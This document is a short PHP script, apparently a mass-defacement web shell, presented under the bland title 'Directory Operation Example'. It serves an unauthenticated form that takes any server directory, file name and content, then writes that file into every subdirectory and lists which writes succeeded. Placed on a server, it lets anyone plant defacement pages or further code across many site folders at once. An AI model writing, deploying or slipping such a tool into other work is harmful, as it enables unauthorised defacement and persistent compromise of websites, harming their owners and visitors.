<?php

echo "<title>Directory Operation Example</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='gray'><font color='black'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "<hr color='black'><font color='black'>Target Folder</font><br>
<input type='text' style='color:lime;background-color:#000000' name='base_dir' value='".htmlspecialchars(getcwd())."'><br><br>";
echo "<font color='black'>Name of File</font><br><input type='text' style='color:lime;background-color:#000000' name='file_name' value='example.txt'><br>";
echo "<font color='black'>File Content</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;' name='file_content'>Sample content</textarea><br>";
echo "<input type='submit' value='Create Files'></form></center>";

if (isset($_POST['base_dir']) && isset($_POST['file_name']) && isset($_POST['file_content'])) {
    $base_dir = $_POST['base_dir'];
    $file_name = $_POST['file_name'];
    $file_content = $_POST['file_content'];

    if (!file_exists($base_dir)) {
        die(htmlspecialchars($base_dir) . " Not Found!<br>");
    }

    if (!is_dir($base_dir)) {
        die(htmlspecialchars($base_dir) . " Is Not A Directory!<br>");
    }

    if (!@chdir($base_dir)) {
        die("Cannot Open Directory");
    }

    $files = @scandir($base_dir);
    if ($files === false) {
        die("Unable to scan directory<br>");
    }

    foreach ($files as $file) {
        if ($file != "." && $file != ".." && @is_dir($file)) {
            $new_file_path = $base_dir . "/" . $file . "/" . $file_name;
            if (file_put_contents($new_file_path, $file_content)) {
                echo "<hr color='black'>>> <font color='black'>".htmlspecialchars($new_file_path)."&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✓)</font>";
            } else {
                echo "<hr color='black'>>> <font color='black'>".htmlspecialchars($new_file_path)."&nbsp&nbsp&nbsp&nbsp</font><font color='red'>(✗)</font>";
            }
        }
    }
}
?>
